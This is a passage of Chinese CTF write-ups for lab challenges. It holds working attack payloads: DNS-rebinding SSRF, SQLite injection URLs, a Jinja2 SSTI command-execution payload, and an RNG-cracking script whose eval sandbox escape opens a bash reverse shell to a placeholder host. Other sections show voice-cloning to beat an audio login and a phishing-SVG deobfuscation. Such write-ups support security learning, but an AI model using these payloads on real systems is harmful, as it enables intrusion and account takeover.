\u0026#39;response\u0026#39;: resp.text}), resp.status_code except Exception: return jsonify({\u0026#39;url\u0026#39;: url, \u0026#39;error\u0026#39;: \u0026#39;something went wrong\u0026#39;}), 500 if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;listening on port 5000\u0026#39;) app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 5001端口绑定了提供flag的服务，5000端口提供正常的web服务，思路是通过/register路由注册url，再通过/trigger路由打SSRF，但是对于is_ip_allowed对于url的限制很严格，简单来看就是过滤了本地ip，同时/trigger路由不允许重定向，无法使用自己的vps搭建的网页中的恶意javascript进行fetch，利用DNS重绑定来绕过：http://08080808.7f000001.rbndr.us:5001/flag\n由于服务器设置的是随机返回第一个或第二个ip，需要多trigger几次：\n{\u0026#34;response\u0026#34;:\u0026#34;sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}\u0026#34;,\u0026#34;status\u0026#34;:200,\u0026#34;url\u0026#34;:\u0026#34;http://08080808.7f000001.rbndr.us:5001/flag\u0026#34;} 参考资料：\nhttps://docs.python.org/zh-cn/3/howto/ipaddress.html\nhttps://lock.cmpxchg8b.com/rebinder.html\nLunar Shop SQLite注入，注入点为product_id：\nhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,group_concat(tbl_name)%20from%20sqlite_master%20where%20type=%27table%27%20--+\rhttps://meteor.sunshinectf.games/product?product_id=0%20union%20select%201,2,3,flag%20from%20flag%20--+ sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}\nWeb Forge robots.txt：\nUser-agent: *\rDisallow: /admin\rDisallow: /fetch\r# internal SSRF testing tool requires special auth header to be set to \u0026#39;true\u0026#39; 使用ffuf进行header的fuzz：\nffuf -u https://wormhole.sunshinectf.games/fetch -H \u0026#34;FUZZ: true\u0026#34; -w uppercase-headers.txt -mc 200\rALLOW [Status: 200, Size: 5252, Words: 1498, Lines: 210, Duration: 1630ms] 找到了访问/fetch服务的header：ALLOW，置为true，尝试对/admin进行SSRF工具测试：\nurl=http://127.0.0.1/admin\rYou\u0026#39;re trying to access /admin but forgot the ?template= parameter 猜测是SSTI，但是尝试SSTI检测报错：\nurl=http://127.0.0.1/admin?template={{7*7}}\rHTTPConnectionPool(host=\u0026#39;127.0.0.1\u0026#39;, port=80): Max retries exceeded with url: /admin?template={{7*7}}\r(Caused by NewConnectionError(\u0026#39;\u0026lt;urllib3.connection.HTTPConnection object at 0x711fb7667130\u0026gt;: Failed to establish a new connection: [Errno 111] Connection refused\u0026#39;) 无法正常连接到服务，猜测不是80端口，利用BurpSuite来爆破出端口8000，常规的SSTI利用无回显，直接上一个能绕过比较多过滤的payload：\nurl=http://127.0.0.1:8000/admin?template={{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;whoami\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} 但是同样无法执行cat等文件读取的命令，使用base64编解码绕过：\nurl=http://127.0.0.1:8000/admin?template={{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;echo+Y2F0IGZsYWcudHh0|base64+-d|bash\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} sun{h34der_fuzz1ng_4nd_ssti_1s_3asy_bc10bf85cabe7078}\n参考资料：\nhttps://onsecurity.io/article/server-side-template-injection-with-jinja2/\n","permalink":"https://blog.w8nn9z.top/posts/ctf/sunshine-ctf-2025-web-writeup/","summary":"","title":"Sunshine CTF 2025 WEB Writeup"},{"content":"guess app.py：\nfrom flask import Flask, request, jsonify, session, render_template, redirect import random rd = random.Random() def generate_random_string(): return str(rd.getrandbits(32)) app = Flask(__name__) app.secret_key = generate_random_string() users = [] a = generate_random_string() @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def register(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;register.html\u0026#39;) data = request.get_json() username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) if not username or not password: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;Username and password are required\u0026#39;}), 400 if any(user[\u0026#39;username\u0026#39;] == username for user in users): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;Username already exists\u0026#39;}), 400 user_id = generate_random_string() users.append({ \u0026#39;user_id\u0026#39;: user_id, \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password }) return jsonify({ \u0026#39;message\u0026#39;: \u0026#39;User registered successfully\u0026#39;, \u0026#39;user_id\u0026#39;: user_id }), 201 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def login(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;login.html\u0026#39;) data = request.get_json() username = data.get(\u0026#39;username\u0026#39;) password = data.get(\u0026#39;password\u0026#39;) if not username or not password: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;Username and password are required\u0026#39;}), 400 user = next((user for user in users if user[\u0026#39;username\u0026#39;] == username and user[\u0026#39;password\u0026#39;] == password), None) if not user: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;Invalid credentials\u0026#39;}), 401 session[\u0026#39;user_id\u0026#39;] = user[\u0026#39;user_id\u0026#39;] session[\u0026#39;username\u0026#39;] = user[\u0026#39;username\u0026#39;] return jsonify({ \u0026#39;message\u0026#39;: \u0026#39;Login successful\u0026#39;, \u0026#39;user_id\u0026#39;: user[\u0026#39;user_id\u0026#39;] }), 200 @app.post(\u0026#39;/api\u0026#39;) def protected_api(): data = request.get_json() key1 = data.get(\u0026#39;key\u0026#39;) if not key1: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;key are required\u0026#39;}), 400 key2 = generate_random_string() if not str(key1) == str(key2): return jsonify({ \u0026#39;message\u0026#39;: \u0026#39;Not Allowed:\u0026#39; + str(key2) , }), 403 payload = data.get(\u0026#39;payload\u0026#39;) if payload: eval(payload, {\u0026#39;__builtin__\u0026#39;:{}}) return jsonify({ \u0026#39;message\u0026#39;: \u0026#39;Access granted\u0026#39;, }) @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;user_id\u0026#39; not in session: return redirect(\u0026#39;/login\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5001) 用random生成随机数使用的是梅森旋转法，攻击脚本：https://github.com/tna0y/Python-random-module-cracker\n本题还删除了builtin的所有内置函数，可以直接通过继承和魔术方法重新获取system\n原脚本里需要624个生成的随机数序列来预测下一个随机数，可以通过创建624个用户的方式来获取，稍微修改一下原脚本就能写出爆破脚本，最后bash反弹shell：\nimport random, time import requests import json from randcrack import RandCrack def random_cracker(): rc = RandCrack() with open(\u0026#34;output.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: lines = f.readlines() for line in lines: rc.submit(int(line.replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;))) return rc def register(): url = \u0026#34;http://49.232.42.74:31914/register\u0026#34; user_id_list = [] for i in range(624): json_data = {\u0026#34;username\u0026#34;: str(i), \u0026#34;password\u0026#34;: \u0026#34;p\u0026#34;} resp = requests.post(url, json=json_data) user_id = (resp.json())[\u0026#39;user_id\u0026#39;] user_id_list.append(user_id) # print(i) return user_id_list def output(user_id_list): with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: for user_id in user_id_list: f.write(user_id + \u0026#34;\\n\u0026#34;) def attack(): url = \u0026#34;http://49.232.42.74:31914/api\u0026#34; rc = random_cracker() for i in range(300): json_data = {\u0026#34;key\u0026#34;: rc.predict_randrange(0, 4294967295), \u0026#34;payload\u0026#34;: f\u0026#34;\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[{i}].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;bash -c \\\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#39;)\u0026#34;} resp = requests.post(url, json=json_data) # print(i) # print(resp.text) user_id_list = register() output(user_id_list) attack() 参考资料：\nhttps://github.com/Luna5akura/BabyPyjail\nphishing email 一封钓鱼邮件，在svg里嵌入了恶意javascript代码，好像是最近的技术，用\u0026lt;![CDATA[ ... ]]\u0026gt;来包装恶意代码，防止被当作XML解析，同时代码中有反调试以及大量混淆，提取关键的部分：\nvar encryptedParts = [ \u0026#39;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y\u0026#39;, \u0026#39;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R\u0026#39;, \u0026#39;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J\u0026#39;, \u0026#39;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B\u0026#39;, \u0026#39;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4\u0026#39; ]; var stage1Results = []; for (var j = 0; j \u0026lt; encryptedParts.length; j++) { var part = encryptedParts[j]; // Convert Unicode escape sequences to characters var decoded = part.replace(/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g, function(match) { var charMap = { \u0026#39;4p2V\u0026#39;: \u0026#39;A\u0026#39;, \u0026#39;4p2P\u0026#39;: \u0026#39;D\u0026#39;, \u0026#39;4p2F\u0026#39;: \u0026#39;E\u0026#39;, \u0026#39;4p2g\u0026#39;: \u0026#39;G\u0026#39;, \u0026#39;4p2a\u0026#39;: \u0026#39;P\u0026#39;, \u0026#39;4p2c\u0026#39;: \u0026#39;S\u0026#39;, \u0026#39;4oyI\u0026#39;: \u0026#39;V\u0026#39;, \u0026#39;4p2T\u0026#39;: \u0026#39;a\u0026#39;, \u0026#39;77iP\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2S\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2L\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2D\u0026#39;: \u0026#39;a\u0026#39;, \u0026#39;4p2O\u0026#39;: \u0026#39;e\u0026#39;, \u0026#39;4p2M\u0026#39;: \u0026#39;e\u0026#39;, \u0026#39;4p2d\u0026#39;: \u0026#39;f\u0026#39;, \u0026#39;77iO\u0026#39;: \u0026#39;g\u0026#39;, \u0026#39;4p2b\u0026#39;: \u0026#39;h\u0026#39;, \u0026#39;4p2Z\u0026#39;: \u0026#39;h\u0026#39;, \u0026#39;4oyL\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;77iM\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2J\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2B\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2R\u0026#39;: \u0026#39;k\u0026#39;, \u0026#39;4p2h\u0026#39;: \u0026#39;m\u0026#39;, \u0026#39;4p2X\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4p2H\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4pyx\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4p2I\u0026#39;: \u0026#39;o\u0026#39;, \u0026#39;4p2A\u0026#39;: \u0026#39;o\u0026#39;, \u0026#39;4p2C\u0026#39;: \u0026#39;s\u0026#39;, \u0026#39;4p2Y\u0026#39;: \u0026#39;s\u0026#39;, \u0026#39;4p2j\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;77iK\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2U\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2K\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2N\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2E\u0026#39;: \u0026#39;v\u0026#39;, \u0026#39;4oyM\u0026#39;: \u0026#39;w\u0026#39;, \u0026#39;77iL\u0026#39;: \u0026#39;{\u0026#39;, \u0026#39;4py9\u0026#39;: \u0026#39;}\u0026#39;, \u0026#39;77iN\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2W\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2Q\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2G\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4py8\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py7\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py6\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py5\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py4\u0026#39;: \u0026#39;!\u0026#39; }; return charMap[match] || \u0026#39;\u0026#39;; }); stage1Results.push(decoded); } var combined = stage1Results.join(\u0026#39;\u0026#39;); console.log(\u0026#39;Stage 1 result:\u0026#39;, combined); // Stage 1 result: wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4 可以看到result里仍然有一些映射表中的键名未被映射，修改一下正则再映射一次：\nvar part = \u0026#34;wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4\u0026#34; var decoded = part.replace(/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]|4py[a-zA-Z0-9]|4oy[a-zA-Z0-9]/g, function(match) { var charMap = { \u0026#39;4p2V\u0026#39;: \u0026#39;A\u0026#39;, \u0026#39;4p2P\u0026#39;: \u0026#39;D\u0026#39;, \u0026#39;4p2F\u0026#39;: \u0026#39;E\u0026#39;, \u0026#39;4p2g\u0026#39;: \u0026#39;G\u0026#39;, \u0026#39;4p2a\u0026#39;: \u0026#39;P\u0026#39;, \u0026#39;4p2c\u0026#39;: \u0026#39;S\u0026#39;, \u0026#39;4oyI\u0026#39;: \u0026#39;V\u0026#39;, \u0026#39;4p2T\u0026#39;: \u0026#39;a\u0026#39;, \u0026#39;77iP\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2S\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2L\u0026#39;: \u0026#39;c\u0026#39;, \u0026#39;4p2D\u0026#39;: \u0026#39;a\u0026#39;, \u0026#39;4p2O\u0026#39;: \u0026#39;e\u0026#39;, \u0026#39;4p2M\u0026#39;: \u0026#39;e\u0026#39;, \u0026#39;4p2d\u0026#39;: \u0026#39;f\u0026#39;, \u0026#39;77iO\u0026#39;: \u0026#39;g\u0026#39;, \u0026#39;4p2b\u0026#39;: \u0026#39;h\u0026#39;, \u0026#39;4p2Z\u0026#39;: \u0026#39;h\u0026#39;, \u0026#39;4oyL\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;77iM\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2J\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2B\u0026#39;: \u0026#39;i\u0026#39;, \u0026#39;4p2R\u0026#39;: \u0026#39;k\u0026#39;, \u0026#39;4p2h\u0026#39;: \u0026#39;m\u0026#39;, \u0026#39;4p2X\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4p2H\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4pyx\u0026#39;: \u0026#39;n\u0026#39;, \u0026#39;4p2I\u0026#39;: \u0026#39;o\u0026#39;, \u0026#39;4p2A\u0026#39;: \u0026#39;o\u0026#39;, \u0026#39;4p2C\u0026#39;: \u0026#39;s\u0026#39;, \u0026#39;4p2Y\u0026#39;: \u0026#39;s\u0026#39;, \u0026#39;4p2j\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;77iK\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2U\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2K\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2N\u0026#39;: \u0026#39;t\u0026#39;, \u0026#39;4p2E\u0026#39;: \u0026#39;v\u0026#39;, \u0026#39;4oyM\u0026#39;: \u0026#39;w\u0026#39;, \u0026#39;77iL\u0026#39;: \u0026#39;{\u0026#39;, \u0026#39;4py9\u0026#39;: \u0026#39;}\u0026#39;, \u0026#39;77iN\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2W\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2Q\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4p2G\u0026#39;: \u0026#39;_\u0026#39;, \u0026#39;4py8\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py7\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py6\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py5\u0026#39;: \u0026#39;!\u0026#39;, \u0026#39;4py4\u0026#39;: \u0026#39;!\u0026#39; }; return charMap[match] || \u0026#39;\u0026#39;; }); console.log(decoded) // wmctwf{SVG_Pchishing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{ng}i!t!{!i!_! 删掉一些无意义的额外字符就能得到flag：wmctf{SVG_Phishing_Attack_Detection_Evasion}\n参考资料：\nhttps://xz.aliyun.com/news/17777\nVoice_hacker 一段UDP流量，猜测传输了一段音频，解码为RTP，再进行RTP流的分析与保存得到一段wav，里面是一段日常的对话\nweb服务要求录入一段指定内容的音频CTF，启动！来进行认证：\n\u0026lt;script\u0026gt; let isRecording = false; let mediaRecorder = null; let audioChunks = []; function showStatus(message, type = \u0026#39;info\u0026#39;) { const statusDiv = document.getElementById(\u0026#39;status\u0026#39;); statusDiv.textContent = message; statusDiv.className = `status ${type}`; statusDiv.style.display = \u0026#39;block\u0026#39;; } function showResult(data) { // 隐藏状态条，只展示结果框，避免同时出现两条信息 const statusDiv = document.getElementById(\u0026#39;status\u0026#39;); statusDiv.style.display = \u0026#39;none\u0026#39;; const resultDiv = document.getElementById(\u0026#39;result\u0026#39;); resultDiv.style.display = \u0026#39;block\u0026#39;; if (data.success) { resultDiv.innerHTML = ` \u0026lt;h3\u0026gt;✅ 认证成功！\u0026lt;/h3\u0026gt; `; } else { resultDiv.innerHTML = ` \u0026lt;h3\u0026gt;❌ 认证失败\u0026lt;/h3\u0026gt; `; } } async function startRecording() { if (isRecording) return; const recordButton = document.getElementById(\u0026#39;recordButton\u0026#39;); recordButton.disabled = true; recordButton.textContent = \u0026#39;录音中...\u0026#39;; recordButton.classList.add(\u0026#39;recording\u0026#39;); showStatus(\u0026#39;正在录音...\u0026#39;, \u0026#39;info\u0026#39;); try { // 模拟录音过程 await simulateRecording(); // 模拟录音完成后自动发送 await submitFakeAudio(); } catch (error) { console.error(\u0026#39;录音错误:\u0026#39;, error); showStatus(\u0026#39;录音失败，请重试\u0026#39;, \u0026#39;error\u0026#39;); resetButton(); } } async function simulateRecording() { // 模拟录音过程，显示倒计时 return new Promise((resolve) =\u0026gt; { let countdown = 3; const interval = setInterval(() =\u0026gt; { if (countdown \u0026gt; 0) { showStatus(`录音中... ${countdown}`, \u0026#39;info\u0026#39;); countdown--; } else { clearInterval(interval); showStatus(\u0026#39;录音完成，正在处理...\u0026#39;, \u0026#39;info\u0026#39;); resolve(); } }, 1000); }); } async function submitFakeAudio() { try { showStatus(\u0026#39;正在认证...\u0026#39;, \u0026#39;info\u0026#39;); // 先获取随机生成的音频文件 console.log(\u0026#39;获取随机音频文件...\u0026#39;); const audioResponse = await fetch(\u0026#39;/api/fake_audio\u0026#39;); if (!audioResponse.ok) { throw new Error(\u0026#39;获取音频文件失败\u0026#39;); } const audioBlob = await audioResponse.blob(); console.log(\u0026#39;获取到音频文件，大小:\u0026#39;, audioBlob.size, \u0026#39;bytes\u0026#39;); // 确保blob有正确的MIME类型 const audioFile = new File([audioBlob], \u0026#39;recording.wav\u0026#39;, { type: \u0026#39;audio/wav\u0026#39; }); // 使用获取到的音频文件进行认证 const formData = new FormData(); formData.append(\u0026#39;audio\u0026#39;, audioFile); console.log(\u0026#39;发送认证请求...\u0026#39;); console.log(\u0026#39;音频文件类型:\u0026#39;, audioFile.type); console.log(\u0026#39;音频文件大小:\u0026#39;, audioFile.size); const response = await fetch(\u0026#39;/api/authenticate\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: formData }); if (!response.ok) { throw new Error(`HTTP ${response.status}: ${response.statusText}`); } const data = await response.json(); console.log(\u0026#39;认证结果:\u0026#39;, data); if (data \u0026amp;\u0026amp; data.success) { showStatus(\u0026#39;认证成功\u0026#39;, \u0026#39;success\u0026#39;); } else { showStatus(\u0026#39;认证失败\u0026#39;, \u0026#39;error\u0026#39;); } showResult(data); } catch (error) { console.error(\u0026#39;认证错误:\u0026#39;, error); showStatus(`认证失败: ${error.message}`, \u0026#39;error\u0026#39;); } finally { resetButton(); } } function resetButton() { const recordButton = document.getElementById(\u0026#39;recordButton\u0026#39;); recordButton.disabled = false; recordButton.textContent = \u0026#39;开始录音\u0026#39;; recordButton.classList.remove(\u0026#39;recording\u0026#39;); } \u0026lt;/script\u0026gt; 尝试根据已有录音AI生成一段指定内容的音频，使用在线网站：https://www.minimax.io/audio\n第一次直接生成认证失败了，第二次往里面添加了几秒的原音频片段用于模仿口音，就能生成通过认证的音频，下载下来是个mp3转一下wav再上传就行：\nimport requests url = \u0026#39;http://49.232.42.74:31999/api/authenticate\u0026#39; audio = \u0026#39;clone2.wav\u0026#39; with open(audio, \u0026#39;rb\u0026#39;) as f: files = { \u0026#39;audio\u0026#39;: (\u0026#39;recording.wav\u0026#39;, f, \u0026#39;audio/wav\u0026#39;) } resp = requests.post(url, files=files) print(resp.text) response：\n{\r\u0026#34;flag\u0026#34;: \u0026#34;WMCTF{01a9a4f1-e748-43fa-8d6d-bba372016adc}\u0026#34;,\r\u0026#34;message\u0026#34;: \u0026#34;\\u8ba4\\u8bc1\\u6210\\u529f\u0026#34;,\r\u0026#34;success\u0026#34;: true\r} 参考资料：\nhttps://www.cnblogs.com/dier-gaohe/p/17716972.html\ngithacker 查看操作日志：\ngit reflog\r484c0d3 (HEAD -\u0026gt; master) HEAD@{0}: commit: have a good time!\r93ab7b9 HEAD@{1}: reset: moving to HEAD~1\rd504bbf HEAD@{2}: commit: encryptedFile\r93ab7b9 HEAD@{3}: commit: change password\r6ec92bc HEAD@{4}: reset: moving to HEAD~1\ra026274 HEAD@{5}: commit: password\r6ec92bc HEAD@{6}: commit: encryptedFile\r6b6285c HEAD@{7}: commit (initial): Init 一条一条查详细信息：\ngit show 6b6285c\rcommit 6b6285cc1283144db890f1b27cc8c7b6ccd4b643\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:13:39 2025 +0800\rInit\rdiff --git a/README.md b/README.md\rnew file mode 100644\rindex 0000000..43122ff\r--- /dev/null\r+++ b/README.md\r@@ -0,0 +1 @@\r+\u0026#34;# Welcome to WMCTF 2025\u0026#34;\rgit show 6ec92bc\rcommit 6ec92bcfdf3044bf21dcfa74500cbb929c0f0037\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:14:06 2025 +0800\rencryptedFile\rdiff --git a/image.png b/image.png\rnew file mode 100644\rindex 0000000..27e6acd\rBinary files /dev/null and b/image.png differ\rgit show a026274\rcommit a026274fb418ec88af16444644fccab9b8a7e8dd\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:14:40 2025 +0800\rpassword\rdiff --git a/password.md b/password.md\rnew file mode 100644\rindex 0000000..1ab140f\r--- /dev/null\r+++ b/password.md\r@@ -0,0 +1 @@\r+\u0026#34;EasyP@ssw0rd_from_Git_History\u0026#34;\rgit show 93ab7b9\rcommit 93ab7b9e28a4d442ec77a3fb37d64912bbddfdad\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:19:32 2025 +0800\rchange password\rgit show d504bbf\rcommit d504bbf75693fc83f6cf5c873306b7fc67edd804\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:23:51 2025 +0800\rencryptedFile\rdiff --git a/image.jpg b/image.jpg\rnew file mode 100644\rindex 0000000..a3a40e3\rBinary files /dev/null and b/image.jpg differ\rgit show 484c0d3\rcommit 484c0d313c560eb48986ef96690ef2f034addc90 (HEAD -\u0026gt; master)\rAuthor: toto \u0026lt;toto@WMCTF2025.com\u0026gt;\rDate: Sat Aug 9 17:25:29 2025 +0800\rhave a good time! 恢复文件：\ngit checkout 6ec92bc -- image.png\rgit checkout a026274 -- password.md\rgit checkout d504bbf -- image.jpg image.png 和 image.jpg 都是VeraCrypt的加密容器，其中image.png能够直接用密码EasyP@ssw0rd_from_Git_History挂载，flag.txt：\nCongratulations! This is half of the gift I gave you:\rWMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_\rDon\u0026#39;t forget the way you came!Please keep trying to find the remaining gifts! 后半段flag肯定在image.jpg中了，但是根据历史记录来看是修改过密码的，无法直接用image.png的密码解密\nVeraCrypt是通过主密钥来加解密文件的，而主密钥存在于加密卷头中，加密卷头又由密码进行加解密，因此如果image.jpg主密钥没变只是修改了密码，那么只需要从image.png中备份加密卷头，再用该加密卷头来恢复image.jpg的密码，这样就可以绕过密码未知的问题：\n1.使用image.png备份加密卷头信息，输入image.png容器密码进行验证\r2.使用备份的加密卷头来恢复image.jpg的加密卷头信息\r3.结束后会提示旧密码已恢复，此时已经可以用EasyP@ssw0rd_from_Git_History来挂载image.jpg容器 flag.txt：\nCongratulations! You\u0026#39;ve solved it!\rFiguring out the volume header manipulation trick is a sign of a true expert.\rYou\u0026#39;ve earned this. Well played!\rAnd_Y0u_M4ster_The_VeraCrypt_H34der_Trick!} 完整flag：WMCTF{G00d_J0b_F1nding_Th3_0ld_V3rsi0n_And_Y0u_M4ster_The_VeraCrypt_H34der_Trick!}\n参考资料：\nhttps://www.reddit.com/r/VeraCrypt/comments/j1gnfx/difference_between_rescue_disk_and_volume_header/?tl=zh-hans\ncatfriend flag硬编码在程序里了，IDA打开搜索字符串就能找到：WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}\nappfriend jadx找到MainActivity：\npublic class MainActivity extends AbstractActivityC0115h { /* renamed from: x, reason: collision with root package name */ public EditText f1494x; static { System.loadLibrary(\u0026#34;yellow\u0026#34;); } public MainActivity() { ((e) this.f818e.f832c).e(\u0026#34;androidx:appcompat\u0026#34;, new C0098a(this)); h(new C0114g(this)); } public native boolean checkflag(String str); @Override // e.AbstractActivityC0115h, androidx.activity.k, x.f, android.app.Activity public final void onCreate(Bundle bundle) { super.onCreate(bundle); View inflate = getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false); int i2 = R.id.button; if (((Button) d.j(inflate, R.id.button)) != null) { if (((EditText) d.j(inflate, R.id.editText)) != null) { if (((TextView) d.j(inflate, R.id.sample_text)) != null) { setContentView((ConstraintLayout) inflate); this.f1494x = (EditText) findViewById(R.id.editText); ((Button) findViewById(R.id.button)).setOnClickListener(new k(2, this)); return; } i2 = R.id.sample_text; } else { i2 = R.id.editText; } } throw new NullPointerException(\u0026#34;Missing required view with ID: \u0026#34;.concat(inflate.getResources().getResourceName(i2))); } } 从lib中加载了yellow，把libyellow.so拖到IDA里：\n解SM4得到flag：\n","permalink":"https://blog.w8nn9z.top/posts/ctf/wmctf-2025-writeup/","summary":"","title":"WMCTF 2025 Writeup"},{"content":" 决赛一共4道web，提供附件的只有本文两题 附件可以从https://github.com/CTF-Archives/2025-LongjianCup-Finals中获取\nezupload index.php：\n\u0026lt;?php session_start(); $session_id = session_id(); $target_dir = \u0026#34;/var/www/html/uploads/$session_id/\u0026#34;; if (!is_dir($target_dir)) { mkdir($target_dir, 0755, true); chown($target_dir, \u0026#39;www-data\u0026#39;); chgrp($target_dir, \u0026#39;www-data\u0026#39;); } ?\u0026gt; \u0026lt;form enctype=\u0026#39;multipart/form-data\u0026#39; action=\u0026#39;\u0026#39; method=\u0026#39;post\u0026#39;\u0026gt; \u0026lt;input type=\u0026#39;file\u0026#39; name=\u0026#39;fileToUpload\u0026#39;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (isset($_FILES[\u0026#39;fileToUpload\u0026#39;])) { $target_file = basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $session_id = session_id(); $target_dir = 